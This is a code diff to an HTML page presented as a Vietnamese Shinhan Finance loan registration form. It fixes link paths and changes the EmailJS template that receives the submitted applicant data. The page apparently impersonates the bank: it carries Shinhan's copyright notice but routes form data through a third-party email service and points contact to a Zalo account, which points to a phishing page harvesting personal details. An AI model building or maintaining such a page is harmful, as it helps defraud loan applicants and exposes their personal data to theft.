@@ -444,7 +444,7 @@
             <div class="dropdown">
                 <i class="bi bi-list" data-bs-toggle="dropdown" aria-expanded="false" aria-label="Menu"></i>
                 <ul class="dropdown-menu dropdown-menu-end">
-                    <li><a class="dropdown-item" href="/Shinhanfinance/Shinhanfinance/pages/vi/loan_registration.html">ĐĂNG KÝ TRỰC TUYẾN</a></li>
+                    <li><a class="dropdown-item" href="/shinhanfinance/pages/vi/loan_registration.html">ĐĂNG KÝ TRỰC TUYẾN</a></li>
                     <li><a class="dropdown-item" href="https://zalo.me/1169203598452254627">LIÊN HỆ</a></li>
                 </ul>
             </div>
@@ -454,13 +454,13 @@
     <div class="container">
         <ul class="nav-tabs">
             <li class="nav-item">
-                <a class="nav-link active" href="/Shinhanfinance/Shinhanfinance/pages/vi/step1.html">1. Nhập thông tin</a>
+                <a class="nav-link active" href="/shinhanfinance/pages/vi/step1.html">1. Nhập thông tin</a>
             </li>
             <li class="nav-item">
-                <a class="nav-link" href="/Shinhanfinance/Shinhanfinance/pages/vi/step1.html">2. Xác thực và xử lý</a>
+                <a class="nav-link" href="/shinhanfinance/pages/vi/step1.html">2. Xác thực và xử lý</a>
             </li>
             <li class="nav-item">
-                <a class="nav-link" href="/Shinhanfinance/Shinhanfinance/pages/vi/step1.html">3. Hoàn thành</a>
+                <a class="nav-link" href="/shinhanfinance/pages/vi/step1.html">3. Hoàn thành</a>
             </li>
         </ul>
 
@@ -968,7 +968,7 @@
             <div class="form-check">
                 <input class="form-check-input" type="checkbox" id="privacyConsent" name="privacyConsent" required>
                 <label class="form-check-label" for="privacyConsent">
-                    Tôi đồng ý với <a href="/Shinhanfinance/Shinhanfinance/pages/vi/chinh-sach-bao-mat.html" target="_blank">Chính sách bảo mật</a> và <a href="/Shinhanfinance/Shinhanfinance/pages/vi/dieu-khoan-su-dung.html" target="_blank">Điều khoản sử dụng</a>.
+                    Tôi đồng ý với <a href="/shinhanfinance/pages/vi/chinh-sach-bao-mat.html" target="_blank">Chính sách bảo mật</a> và <a href="/shinhanfinance/pages/vi/dieu-khoan-su-dung.html" target="_blank">Điều khoản sử dụng</a>.
                 </label>
                 <div class="invalid-feedback" id="privacyConsentError"></div>
             </div>
@@ -988,9 +988,9 @@
 
     <div class="footer">
         <div class="footer-links">
-            <a href="/Shinhanfinance/Shinhanfinance/pages/vi/chinh-sach-bao-mat.html">Chính sách bảo mật</a> |
+            <a href="/shinhanfinance/pages/vi/chinh-sach-bao-mat.html">Chính sách bảo mật</a> |
             <a href="https://zalo.me/1169203598452254627">Liên hệ</a> |
-            <a href="/Shinhanfinance/Shinhanfinance/pages/vi/dieu-khoan-su-dung.html">Điều khoản sử dụng</a>
+            <a href="/shinhanfinance/pages/vi/dieu-khoan-su-dung.html">Điều khoản sử dụng</a>
         </div>
         <p class="mt-2">Bản quyền © 2017 thuộc về Ngân hàng TNHH MTV SHINHAN Việt Nam. Mọi quyền được bảo lưu.</p>
     </div>
@@ -1605,12 +1605,12 @@
 
             try {
                 if (!emailjs) throw new Error('EmailJS not initialized');
-                const response = await emailjs.send('service_zspw0b7', 'template_9jk2poj', templateParams);
+                const response = await emailjs.send('service_zspw0b7', 'template_229osxj', templateParams);
                 console.log('Email sent:', response.status, response.text);
                 userData.emailSent = true;
                 saveToLocalStorage();
                 spinner.hide();
-                window.location.href = '/Shinhanfinance/Shinhanfinance/pages/vi/step2.html';
+                window.location.href = '/shinhanfinance/pages/vi/step2.html';
             } catch (error) {
                 console.error('Email send failed:', error);
                 alert('Gửi đăng ký không thành công. Vui lòng thử lại sau.');
@@ -1623,6 +1623,7 @@
     </script>
 </body>
 </html>
+
 
 
 
